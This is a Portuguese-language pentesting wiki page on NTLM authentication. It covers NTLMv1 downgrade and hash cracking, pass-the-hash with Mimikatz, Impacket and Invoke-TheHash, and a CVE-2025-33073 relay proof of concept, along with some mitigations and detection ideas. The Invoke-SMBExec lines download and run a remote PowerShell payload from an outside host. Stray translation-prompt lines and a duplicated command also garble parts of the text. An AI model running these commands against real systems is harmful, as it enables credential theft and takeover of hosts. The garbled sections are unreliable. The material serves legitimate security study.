# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Informações básicas

Em ambientes onde **Windows XP e Server 2003** estão em operação, hashes LM (Lan Manager) são utilizados, embora seja amplamente reconhecido que eles podem ser facilmente comprometidos. Um hash LM específico, `AAD3B435B51404EEAAD3B435B51404EE`, indica um cenário em que LM não é utilizado, representando o hash de uma string vazia.

Por padrão, o protocolo de autenticação **Kerberos** é o método principal utilizado. O NTLM (NT LAN Manager) é utilizado em circunstâncias específicas: ausência do Active Directory, inexistência do domínio, falha do Kerberos devido a uma configuração inadequada ou quando as conexões são tentadas usando um endereço IP em vez de um hostname válido.

A presença do cabeçalho **"NTLMSSP"** nos pacotes de rede indica um processo de autenticação NTLM.

O suporte aos protocolos de autenticação - LM, NTLMv1 e NTLMv2 - é fornecido por uma DLL específica localizada em `%windir%\Windows\System32\msv1\_0.dll`.

**Pontos principais**:

- Hashes LM são vulneráveis, e um hash LM vazio (`AAD3B435B51404EEAAD3B435B51404EE`) indica que ele não é utilizado.
- Kerberos é o método de autenticação padrão, enquanto NTLM é utilizado apenas sob determinadas condições.
- Pacotes de autenticação NTLM podem ser identificados pelo cabeçalho "NTLMSSP".
- Os protocolos LM, NTLMv1 e NTLMv2 são suportados pelo arquivo de sistema `msv1\_0.dll`.

## LM, NTLMv1 e NTLMv2

Você pode verificar e configurar qual protocolo será utilizado:

### GUI

Execute _secpol.msc_ -> Políticas locais -> Opções de segurança -> Segurança de rede: nível de autenticação do LAN Manager. Existem 6 níveis (de 0 a 5).

![LM, NTLMv1 e NTLMv2 - GUI: Execute secpol.msc - Políticas locais - Opções de segurança - Segurança de rede: nível de autenticação do LAN Manager. Existem 6 níveis (de 0 a 5)](<../../images/image (919).png>)

### Registro

Isso definirá o nível 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Valores possíveis:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Esquema básico de autenticação de domínio NTLM

1. O **usuário** introduz suas **credenciais**
2. A máquina cliente **envia uma solicitação de autenticação**, enviando o **nome do domínio** e o **username**
3. O **server** envia o **challenge**
4. O **cliente criptografa** o **challenge** usando o hash da senha como chave e o envia como resposta
5. O **server envia** ao **Domain controller** o **nome do domínio, o username, o challenge e a resposta**. Se não houver um Active Directory configurado ou se o nome do domínio for o nome do server, as credenciais serão **verificadas localmente**.
6. O **Domain controller verifica se tudo está correto** e envia as informações ao server

O **server** e o **Domain Controller** podem criar um **Secure Channel** por meio do server **Netlogon**, pois o Domain Controller conhece a senha do server (ela está dentro do banco de dados **NTDS.DIT**).

### Esquema de autenticação NTLM local

A autenticação é igual à mencionada **anteriormente, mas** o **server** conhece o **hash do usuário** que tenta se autenticar dentro do arquivo **SAM**. Portanto, em vez de perguntar ao Domain Controller, o **server verificará por conta própria** se o usuário pode se autenticar.

### NTLMv1 Challenge

O **tamanho do challenge é de 8 bytes** e a **resposta** tem **24 bytes**.

O **hash NT (16 bytes)** é dividido em **3 partes de 7 bytes cada** (7B + 7B + (2B+0x00\*5)): a **última parte é preenchida com zeros**. Em seguida, o **challenge** é **cifrado separadamente** com cada parte e os bytes cifrados **resultantes** são **concatenados**. Total: 8B + 8B + 8B = 24Bytes.

**Problemas**:

- Falta de **aleatoriedade**
- As 3 partes podem ser **atacadas separadamente** para encontrar o hash NT
- **DES é crackeável**
- A 3ª chave é sempre composta por **5 zeros**.
- Dado o **mesmo challenge**, a **resposta** será a **mesma**. Assim, você pode fornecer como **challenge** à vítima a string "**1122334455667788**" e atacar a resposta usando **rainbow tables pré-computadas**.

### NTLMv1 attack

Unconstrained delegation é menos comum em ambientes modernos, mas um serviço **Print Spooler** acessível ainda pode ser abusado para coagir a autenticação a tal host.

Você poderia abusar de algumas credenciais/sessões que já possui no AD para **pedir à impressora que se autentique** contra algum **host sob seu controle**. Em seguida, usando `metasploit auxiliary/server/capture/smb` ou `responder`, você pode **definir o challenge de autenticação como 1122334455667788**, capturar a tentativa de autenticação e, se ela tiver sido realizada usando **NTLMv1**, poderá **quebrá-la**.\
Se estiver usando `responder`, você pode tentar **usar a flag `--lm`** para tentar **fazer downgrade** da **autenticação**.\
_Observe que, para esta técnica, a autenticação deve ser realizada usando NTLMv1 (NTLMv2 não é válido)._

Lembre-se de que a impressora usará a conta do computador durante a autenticação, e as contas de computador usam **senhas longas e aleatórias** que você **provavelmente não conseguirá quebrar** usando **dicionários** comuns. Porém, a autenticação **NTLMv1** **usa DES** ([mais informações aqui](#ntlmv1-challenge)); portanto, usando alguns serviços especialmente dedicados a quebrar DES, você conseguirá quebrá-la (você poderia usar [https://crack.sh/](https://crack.sh) ou [https://ntlmv1.com/](https://ntlmv1.com), por exemplo).

### NTLMv1 attack with hashcat

O NTLMv1 também pode ser atacado com [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi), que converte mensagens NTLMv1 capturadas em formatos adequados para o Hashcat.<sup>[[1]](#references)</sup>

O comando
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
Please provide the content to translate.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Please provide the content to be included in the file.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Execute o hashcat (a execução distribuída é melhor por meio de uma ferramenta como o hashtopolis), pois, caso contrário, isso levará vários dias.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
Neste caso, sabemos que a senha é password, então vamos trapacear para fins de demonstração:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Agora precisamos usar os hashcat-utilities para converter as chaves des quebradas em partes do hash NTLM:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Envie o último trecho que deseja traduzir.
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Please provide the English content to translate.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**O comprimento do challenge é de 8 bytes** e **2 respostas são enviadas**: Uma tem **24 bytes** de comprimento e o comprimento da **outra** é **variável**.

**A primeira resposta** é criada cifrando, usando **HMAC_MD5**, a **string** composta pelo **cliente e pelo domínio** e usando como **chave** o **hash MD4** do **NT hash**. Em seguida, o **resultado** será usado como **chave** para cifrar, usando **HMAC_MD5**, o **challenge**. A isso, **um challenge do cliente de 8 bytes será adicionado**. Total: 24 B.

**A segunda resposta** é criada usando **vários valores** (um novo challenge do cliente, um **timestamp** para evitar **replay attacks**...)

Se você tiver um **PCAP contendo uma troca de autenticação bem-sucedida**, extraia o domínio, o nome de usuário, o challenge do servidor e a resposta NTLMv2, formate a captura para o Hashcat e use o modo `5600` para tentar recuperar a senha. O walkthrough prático arquivado mantém o procedimento de extração dos campos dos pacotes, enquanto os exemplos do Hashcat definem o formato atualmente aceito.<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**Depois de obter o hash da vítima**, você pode usá-lo para **se passar por ela**.\
Você precisa usar uma **ferramenta** que **execute** a **autenticação NTLM usando** esse **hash**, **ou** pode criar um novo **sessionlogon** e **injetar** esse **hash** no **LSASS**, para que, quando qualquer **autenticação NTLM seja executada**, esse **hash seja usado.** Essa é a opção usada pelo mimikatz.

**Lembre-se de que você também pode executar ataques Pass-the-Hash usando contas de computador.**

### **Mimikatz**

**Precisa ser executado como administrador**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Isso inicia um processo sob o usuário local atual, enquanto o LSASS associa as credenciais fornecidas ao logon de rede de saída. Você pode então acessar recursos de rede como o usuário fornecido, de forma semelhante a `runas /netonly`, sem saber a senha em texto simples.

### Pass-the-Hash do Linux

Você pode obter execução de código em máquinas Windows usando Pass-the-Hash do Linux.\
[**Veja exemplos práticos de execução de Pass-the-Hash.**](../lateral-movement/psexec-and-winexec.md#pass-the-hash)

### Ferramentas compiladas do Impacket para Windows

Você pode baixar[ os binários do impacket para Windows aqui](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (Neste caso, você precisa especificar um comando; cmd.exe e powershell.exe não são válidos para obter um shell interativo)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Há vários outros binários do Impacket...

### Invoke-TheHash

Você pode obter os scripts do powershell aqui: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Esta função combina os modos anteriores. Você pode passar **vários hosts**, excluir alvos selecionados e escolher _SMBExec, WMIExec, SMBClient,_ ou _SMBEnum_. Se você selecionar **SMBExec** ou **WMIExec** sem um parâmetro _**Command**_, ela apenas verifica se você tem permissões suficientes.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Precisa ser executado como administrador**

Esta ferramenta fará a mesma coisa que o mimikatz (modificar a memória do LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Execução remota manual do Windows com username e password


{{#ref}}
../lateral-movement/
{{#endref}}

## Extraindo credenciais de um Host Windows

Para mais informações, consulte [**Stealing Windows Credentials**](../stealing-credentials/README.md).

## Internal Monologue attack

O Internal Monologue Attack é uma técnica furtiva de extração de credenciais que permite a um atacante recuperar hashes NTLM da máquina da vítima **sem interagir diretamente com o processo LSASS**. Ao contrário do Mimikatz, que lê hashes diretamente da memória e é frequentemente bloqueado por soluções de segurança de endpoint ou pelo Credential Guard, esse ataque utiliza **chamadas locais ao pacote de autenticação NTLM (MSV1_0) por meio da Security Support Provider Interface (SSPI)**. Primeiro, o atacante **faz downgrade das configurações do NTLM** (por exemplo, LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) para garantir que o NetNTLMv1 seja permitido. Em seguida, ele personifica tokens de usuário existentes obtidos de processos em execução e aciona a autenticação NTLM localmente para gerar respostas NetNTLMv1 usando um challenge conhecido.<sup>[[4]](#references)</sup>

Após capturar essas respostas NetNTLMv1, o atacante pode recuperar rapidamente os hashes NTLM originais usando **rainbow tables pré-computadas**, permitindo outros ataques Pass-the-Hash para lateral movement. É importante destacar que o Internal Monologue Attack permanece furtivo porque não gera tráfego de rede, injeta código nem aciona dumps diretos de memória, tornando sua detecção mais difícil para os defensores em comparação com métodos tradicionais, como o Mimikatz.

Se o NetNTLMv1 não for aceito — devido a políticas de segurança impostas —, o atacante poderá não conseguir recuperar uma resposta NetNTLMv1.

Para lidar com esse caso, a ferramenta Internal Monologue foi atualizada: ela adquire dinamicamente um token de servidor usando `AcceptSecurityContext()` para ainda **capturar respostas NetNTLMv2** se o NetNTLMv1 falhar. Embora o NetNTLMv2 seja muito mais difícil de crackear, ele ainda abre caminho para relay attacks ou brute-force offline em casos limitados.

O PoC pode ser encontrado em **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.<sup>[[4]](#references)</sup>

## NTLM Relay e Responder

**Leia aqui um guia mais detalhado sobre como realizar esses ataques:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Analisar challenges NTLM a partir de uma captura de rede

**Você pode usar** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM e Kerberos *Reflection* via SPNs serializados (CVE-2025-33073)

O Windows contém várias mitigações que tentam impedir ataques de *reflection*, nos quais uma autenticação NTLM (ou Kerberos) originada em um host é retransmitida de volta para o **mesmo** host para obter privilégios de SYSTEM.

A Microsoft interrompeu a maioria das cadeias públicas com o MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) e patches posteriores; no entanto, o **CVE-2025-33073** mostra que as proteções ainda podem ser contornadas abusando da forma como o **cliente SMB trunca Service Principal Names (SPNs)** que contêm target-info *marshalled* (serializado).<sup>[[5]](#references)[[6]](#references)</sup>

### TL;DR do bug
1. Um atacante registra um **registro DNS A** cujo label codifica um SPN marshalled — por exemplo:
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. A vítima é coagida a se autenticar nesse hostname (PetitPotam, DFSCoerce etc.).
3. Quando o cliente SMB passa a string de destino `cifs/srv11UWhRCAAAAA…` para `lsasrv!LsapCheckMarshalledTargetInfo`, a chamada a `CredUnmarshalTargetInfo` **remove** o blob serializado, deixando **`cifs/srv1`**.
4. `msv1_0!SspIsTargetLocalhost` (ou o equivalente do Kerberos) agora considera o destino como *localhost* porque a parte curta do host corresponde ao nome do computador (`SRV1`).
5. Consequentemente, o servidor define `NTLMSSP_NEGOTIATE_LOCAL_CALL` e injeta o **access-token de SYSTEM do LSASS** no contexto (para Kerberos, uma subsession key marcada como SYSTEM é criada).
6. Retransmitir essa autenticação com `ntlmrelayx.py` **ou** `krbrelayx.py` concede direitos completos de SYSTEM no mesmo host.<sup>[[5]](#references)</sup>

### PoC rápido
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patch & Mitigações
* O patch da KB para **CVE-2025-33073** adiciona uma verificação em `mrxsmb.sys::SmbCeCreateSrvCall` que bloqueia qualquer conexão SMB cujo destino contenha informações marshalled (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Aplicar **SMB signing** para impedir reflection mesmo em hosts sem patch.
* Monitorar registros DNS semelhantes a `*<base64>...*` e bloquear vetores de coerção (PetitPotam, DFSCoerce, AuthIP...).

### Ideias de detecção
* Capturas de rede com `NTLMSSP_NEGOTIATE_LOCAL_CALL` onde o IP do cliente ≠ IP do servidor.
* Kerberos AP-REQ contendo uma subsession key e um client principal igual ao hostname.
* Logons SYSTEM dos eventos 4624/4648 do Windows imediatamente seguidos por gravações SMB remotas a partir do mesmo host.<sup>[[5]](#references)</sup>

Para a variante de local reflection de **março de 2026**, que explora **SMB arbitrary ports** e **TCP connection reuse** para alcançar `NT AUTHORITY\SYSTEM`, consulte:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – Multitool NTLMv1](https://github.com/evilmog/ntlmv1-multi)
- [2] [Hashes de exemplo do Hashcat – NetNTLMv2 (modo 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – Utilitários PowerShell Pass The Hash](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Ataque Internal Monologue: obtendo hashes NTLM sem tocar no LSASS](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection está morto, vida longa ao NTLM Reflection!](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [Cracking de um hash NTLMv2 – 801Labs (Internet Archive)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
